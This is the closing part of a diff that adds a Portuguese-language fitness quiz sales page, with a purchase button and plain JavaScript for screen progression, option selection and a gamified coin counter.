+                    💪 SIM, QUERO TRANSFORMAR MEU CORPO
+                </button>
+
+                <p style="text-align: center; margin-top: 20px; color: rgba(255, 255, 255, 0.6); font-size: 14px;">
+                    🔒 Pagamento 100% seguro | ✅ Acesso imediato após confirmação
+                </p>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        let currentScreen = 1;
+        let totalCoins = 0;
+        const totalScreens = 42; // 41 telas de quiz + 1 tela final
+
+        // Atualizar progresso
+        function updateProgress() {
+            const progress = (currentScreen / totalScreens) * 100;
+            document.getElementById('progressFill').style.width = progress + '%';
+            document.getElementById('currentStep').textContent = currentScreen;
+            document.getElementById('totalSteps').textContent = totalScreens;
+        }
+
+        // Atualizar coins
+        function updateCoins(amount) {
+            totalCoins += amount;
+            document.getElementById('coinsCount').textContent = totalCoins;
+            
+            // Animação de coin
+            const coinAnim = document.createElement('div');
+            coinAnim.className = 'coin-animation';
+            coinAnim.textContent = '+' + amount + ' 💰';
+            coinAnim.style.left = Math.random() * window.innerWidth + 'px';
+            coinAnim.style.top = '100px';
+            document.body.appendChild(coinAnim);
+            
+            setTimeout(() => {
+                coinAnim.remove();
+            }, 1000);
+        }
+
+        // Selecionar opção
+        function selectOption(element, screenNum, coins, autoAdvance) {
+            // Remover seleção anterior
+            const options = element.parentElement.querySelectorAll('.option, .option-with-image');
+            options.forEach(opt => opt.classList.remove('selected'));
+            
+            // Adicionar seleção
+            element.classList.add('selected');
+            
+            // Adicionar coins
+            updateCoins(coins);
+            
+            // Habilitar botão continuar se existir
+            const btn = document.getElementById('btn-' + screenNum);
+            if (btn) {
+                btn.disabled = false;
+            }
+            
+            // Avançar automaticamente se configurado
+            if (autoAdvance) {
+                setTimeout(() => {
+                    nextScreen();
+                }, 600);
+            }
+        }
+
+
+        // Próxima tela
+        function nextScreen() {
+            // Esconder tela atual
+            document.querySelector('.screen.active').classList.remove('active');
+            
+            // Avançar para próxima tela
+            currentScreen++;
+            
+            // Mostrar próxima tela
+            const nextScreenElement = document.querySelector(`[data-screen="${currentScreen}"]`);
+            if (nextScreenElement) {
+                nextScreenElement.classList.add('active');
+                updateProgress();
+                
+                // Scroll para o topo
+                window.scrollTo(0, 0);
+                
+                // Se for a tela final, atualizar coins
+                if (currentScreen === 42) {
+                    document.getElementById('finalCoins').textContent = totalCoins;
+                }
+            }
+        }
+
+        // Inicializar
+        updateProgress();
+    </script>
+
+
+</body></html>
